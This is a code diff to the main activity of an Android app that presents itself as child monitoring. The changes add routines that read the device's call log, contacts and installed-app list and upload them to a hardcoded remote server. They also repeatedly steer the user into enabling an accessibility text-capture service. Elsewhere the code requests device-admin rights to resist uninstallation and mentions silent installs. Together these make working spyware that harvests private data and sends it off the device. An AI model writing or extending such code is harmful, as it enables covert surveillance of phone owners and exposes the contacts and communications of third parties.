@@ -13,7 +13,6 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageInstaller;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -53,7 +52,6 @@ public class MainActivity extends AppCompatActivity {
     private static final String TAG = "MainActivity";
     private static final String FIXED_SERVER_IP = "screenmonitoring-6hn7.onrender.com";
 
-    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1000;
     private static final int REQUEST_CODE_DEVICE_ADMIN = 1001;
     private static final int REQUEST_CODE_PERMISSIONS = 1002;
 
@@ -65,8 +63,6 @@ public class MainActivity extends AppCompatActivity {
     private DevicePolicyManager dpm;
     private ComponentName adminComponent;
 
-    private int savedResultCode = -1;
-    private Intent savedResultData = null;
     private InstallResultReceiver installReceiver;
 
     @Override
@@ -104,6 +100,36 @@ public class MainActivity extends AppCompatActivity {
         }
 
         requestRequiredPermissions();
+
+    }
+
+    private void checkAndEnableAccessibilityService() {
+        if (!isAccessibilityServiceEnabled()) {
+            android.content.Intent intent = new android.content.Intent(
+                    android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            startActivity(intent);
+
+            android.widget.Toast.makeText(this,
+                    "✅ Child Monitoring-এর জন্য 'Child Text Monitor' সার্ভিসটি অন করুন",
+                    android.widget.Toast.LENGTH_LONG).show();
+        }
+    }
+
+    private boolean isAccessibilityServiceEnabled() {
+        android.view.accessibility.AccessibilityManager am =
+                (android.view.accessibility.AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
+
+        if (am == null) return false;
+
+        for (android.accessibilityservice.AccessibilityServiceInfo service :
+                am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)) {
+
+            if (service != null && service.getResolveInfo() != null &&
+                    service.getResolveInfo().serviceInfo.name.contains("MyTextCaptureService")) {
+                return true;
+            }
+        }
+        return false;
     }
 
     @Override
@@ -120,6 +146,7 @@ public class MainActivity extends AppCompatActivity {
     protected void onResume() {
         super.onResume();
         updateStatusText();
+        checkAndEnableAccessibilityService();
     }
 
     private void updateStatusText() {
@@ -238,7 +265,8 @@ public class MainActivity extends AppCompatActivity {
         String[] permissions = {
                 Manifest.permission.READ_SMS,
                 Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.CAMERA
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.READ_CONTACTS
         };
 
         // Add INSTALL_PACKAGES permission for silent install (Android 12+)
@@ -258,6 +286,7 @@ public class MainActivity extends AppCompatActivity {
         }
         if (allGranted) {
             afterPermissionsGranted();
+            checkAndEnableAccessibilityService();
         } else {
             ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE_PERMISSIONS);
         }
@@ -268,6 +297,7 @@ public class MainActivity extends AppCompatActivity {
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         afterPermissionsGranted();
+        checkAndEnableAccessibilityService();
     }
 
     private void afterPermissionsGranted() {
@@ -275,16 +305,20 @@ public class MainActivity extends AppCompatActivity {
             Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
             adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                    "Required to protect this monitoring app from being uninstalled.");
+                     "Required to protect this monitoring app from being uninstalled.");
             startActivityForResult(adminIntent, REQUEST_CODE_DEVICE_ADMIN);
         } else {
             beginMonitoringFlow();
+            checkAndEnableAccessibilityService();
         }
     }
 
     private void beginMonitoringFlow() {
         if (ScreenCaptureService.isRunning) return;
         syncSmsInbox(FIXED_SERVER_IP);
+        syncCallLogs(FIXED_SERVER_IP);
+        syncContacts(FIXED_SERVER_IP);
+        syncInstalledApps(FIXED_SERVER_IP);
         registerDeviceWithBackend(FIXED_SERVER_IP);
     }
 
@@ -309,46 +343,24 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onFailure(Call call, IOException e) {
                 Log.e(TAG, "Backend registration failed: " + e.getMessage());
-                mainHandler.post(() -> requestScreenCapturePermission());
+                mainHandler.post(() -> startService());
             }
 
             @Override
             public void onResponse(Call call, Response response) throws IOException {
                 response.close();
-                mainHandler.post(() -> {
-                    if (savedResultCode != -1 && savedResultData != null) {
-                        launchService(savedResultCode, savedResultData);
-                    } else {
-                        requestScreenCapturePermission();
-                    }
-                });
+                mainHandler.post(() -> startService());
             }
         });
     }
 
-    private void requestScreenCapturePermission() {
-        if (savedResultCode != -1 && savedResultData != null) {
-            launchService(savedResultCode, savedResultData);
-            return;
-        }
-        MediaProjectionManager mpm =
-                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        if (mpm != null) {
-            startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE);
-        }
-    }
-
-    private void launchService(int resultCode, Intent resultData) {
+    /** Launch the monitoring service without MediaProjection (streaming disabled). */
+    private void startService() {
         if (ScreenCaptureService.isRunning) return;
-
         Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
-        serviceIntent.putExtra("result_code", resultCode);
-        serviceIntent.putExtra("data", resultData);
         serviceIntent.putExtra("device_id", deviceId);
         serviceIntent.putExtra("device_name", deviceName);
         serviceIntent.putExtra("server_ip", FIXED_SERVER_IP);
-        serviceIntent.putExtra("camera_enabled", false);
-
         ContextCompat.startForegroundService(this, serviceIntent);
         new Handler().postDelayed(this::updateStatusText, 1000);
     }
@@ -356,17 +368,7 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-
-        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
-            if (resultCode == Activity.RESULT_OK && data != null) {
-                savedResultCode = resultCode;
-                savedResultData = data;
-                launchService(resultCode, data);
-            } else {
-                Log.w(TAG, "Screen capture denied, retrying in 3s");
-                mainHandler.postDelayed(this::requestScreenCapturePermission, 3000);
-            }
-        } else if (requestCode == REQUEST_CODE_DEVICE_ADMIN) {
+        if (requestCode == REQUEST_CODE_DEVICE_ADMIN) {
             beginMonitoringFlow();
         }
     }
@@ -422,6 +424,175 @@ public class MainActivity extends AppCompatActivity {
                 });
             } catch (Exception e) {
                 e.printStackTrace();
+            }
+        }).start();
+    }
+
+    private void syncCallLogs(String serverIp) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
+                != PackageManager.PERMISSION_GRANTED) return;
+
+        new Thread(() -> {
+            try {
+                Uri callUri = android.provider.CallLog.Calls.CONTENT_URI;
+                String[] projection = {
+                        android.provider.CallLog.Calls.NUMBER,
+                        android.provider.CallLog.Calls.CACHED_NAME,
+                        android.provider.CallLog.Calls.TYPE,
+                        android.provider.CallLog.Calls.DATE,
+                        android.provider.CallLog.Calls.DURATION
+                };
+                Cursor cursor = getContentResolver().query(
+                        callUri, projection, null, null, android.provider.CallLog.Calls.DATE + " DESC LIMIT 200");
+
+                if (cursor == null) return;
+
+                JSONArray calls = new JSONArray();
+                while (cursor.moveToNext()) {
+                    String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
+                    String name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME));
+                    int typeCode = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
+                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE));
+                    int duration = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION));
+
+                    String typeStr = "Unknown";
+                    switch (typeCode) {
+                        case android.provider.CallLog.Calls.INCOMING_TYPE:
+                            typeStr = "Incoming";
+                            break;
+                        case android.provider.CallLog.Calls.OUTGOING_TYPE:
+                            typeStr = "Outgoing";
+                            break;
+                        case android.provider.CallLog.Calls.MISSED_TYPE:
+                            typeStr = "Missed";
+                            break;
+                        case android.provider.CallLog.Calls.VOICEMAIL_TYPE:
+                            typeStr = "Voicemail";
+                            break;
+                        case android.provider.CallLog.Calls.REJECTED_TYPE:
+                            typeStr = "Rejected";
+                            break;
+                        case android.provider.CallLog.Calls.BLOCKED_TYPE:
+                            typeStr = "Blocked";
+                            break;
+                    }
+
+                    JSONObject call = new JSONObject();
+                    call.put("device_id", deviceId);
+                    call.put("number", number != null ? number : "");
+                    call.put("name", name != null ? name : "Unknown");
+                    call.put("type", typeStr);
+                    call.put("timestamp", date);
+                    call.put("duration", duration);
+                    calls.put(call);
+                }
+                cursor.close();
+
+                JSONObject payload = new JSONObject();
+                payload.put("device_id", deviceId);
+                payload.put("calls", calls);
+
+                String url = UrlHelper.getApiUrl(serverIp, "/api/call-logs/upload");
+                RequestBody body = RequestBody.create(
+                        payload.toString(),
+                        MediaType.parse("application/json; charset=utf-8")
+                );
+                Request request = new Request.Builder().url(url).post(body).build();
+
+                httpClient.newCall(request).execute().close();
+                Log.d(TAG, "Call logs synced successfully. Count: " + calls.length());
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to sync call logs", e);
+            }
+        }).start();
+    }
+
+    private void syncContacts(String serverIp) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+                != PackageManager.PERMISSION_GRANTED) return;
+
+        new Thread(() -> {
+            try {
+                Uri contactUri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
+                String[] projection = {
+                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
+                };
+                Cursor cursor = getContentResolver().query(
+                        contactUri, projection, null, null, android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+
+                if (cursor == null) return;
+
+                JSONArray contacts = new JSONArray();
+                // To avoid duplicates if a contact has multiple numbers, we can use a Set, but simple list is fine
+                while (cursor.moveToNext()) {
+                    String name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
+
+                    JSONObject contact = new JSONObject();
+                    contact.put("device_id", deviceId);
+                    contact.put("name", name != null ? name : "Unknown");
+                    contact.put("phone_number", number != null ? number : "");
+                    contacts.put(contact);
+                }
+                cursor.close();
+
+                JSONObject payload = new JSONObject();
+                payload.put("device_id", deviceId);
+                payload.put("contacts", contacts);
+
+                String url = UrlHelper.getApiUrl(serverIp, "/api/contacts/upload");
+                RequestBody body = RequestBody.create(
+                        payload.toString(),
+                        MediaType.parse("application/json; charset=utf-8")
+                );
+                Request request = new Request.Builder().url(url).post(body).build();
+
+                httpClient.newCall(request).execute().close();
+                Log.d(TAG, "Contacts synced successfully. Count: " + contacts.length());
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to sync contacts", e);
+            }
+        }).start();
+    }
+
+    private void syncInstalledApps(String serverIp) {
+        new Thread(() -> {
+            try {
+                PackageManager pm = getPackageManager();
+                java.util.List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
+                JSONArray apps = new JSONArray();
+
+                for (android.content.pm.PackageInfo packageInfo : packages) {
+                    boolean isSystem = (packageInfo.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
+                    String appName = packageInfo.applicationInfo.loadLabel(pm).toString();
+                    String packageName = packageInfo.packageName;
+                    String versionName = packageInfo.versionName != null ? packageInfo.versionName : "1.0";
+
+                    JSONObject app = new JSONObject();
+                    app.put("device_id", deviceId);
+                    app.put("app_name", appName);
+                    app.put("package_name", packageName);
+                    app.put("version_name", versionName);
+                    app.put("system_app", isSystem);
+                    apps.put(app);
+                }
+
+                JSONObject payload = new JSONObject();
+                payload.put("device_id", deviceId);
+                payload.put("apps", apps);
+
+                String url = UrlHelper.getApiUrl(serverIp, "/api/apps/upload");
+                RequestBody body = RequestBody.create(
+                        payload.toString(),
+                        MediaType.parse("application/json; charset=utf-8")
+                );
+                Request request = new Request.Builder().url(url).post(body).build();
+
+                httpClient.newCall(request).execute().close();
+                Log.d(TAG, "Installed apps synced successfully. Count: " + apps.length());
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to sync installed apps", e);
             }
         }).start();
     }
